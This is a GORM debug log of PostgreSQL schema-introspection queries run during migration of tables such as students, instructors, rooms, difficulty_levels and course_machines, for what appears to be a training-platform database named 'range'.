[0m[33m[0.921ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'is_premiem') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.463ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.894ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND constraint_name = 'fk_students_user'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.513ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_students_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.825ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_student_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.598ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.103ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.714ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'instructors'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.560ms] [34;1m[rows:-][0m SELECT * FROM "instructors" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[36.268ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[36.179ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.169ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'instructors'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.726ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.694ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.148ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.387ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.457ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'account_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.931ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.883ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND constraint_name = 'fk_instructors_user'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.840ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructors_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.896ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructor_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.945ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.522ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.588ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'rooms'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.134ms] [34;1m[rows:-][0m SELECT * FROM "rooms" LIMIT 5

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[48.049ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[45.197ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.639ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'rooms'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.143ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.181ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.168ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.821ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.093ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.416ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.109ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'room_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.577ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.108ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'instructor_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.885ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND constraint_name = 'fk_rooms_instructor'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.579ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'rooms' AND indexname = 'idx_rooms_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.678ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.350ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.864ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.495ms] [34;1m[rows:-][0m SELECT * FROM "difficulty_levels" LIMIT 5

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[14.804ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[17.574ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.532ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'difficulty_levels'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.065ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.049ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.419ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.026ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.972ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'level') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.806ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'difficulty_levels' AND indexname = 'idx_difficulty_levels_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.646ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.395ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.735ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.508ms] [34;1m[rows:-][0m SELECT * FROM "course_machines" LIMIT 5

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[20.576ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[16.973ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.548ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'course_machines'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.084ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

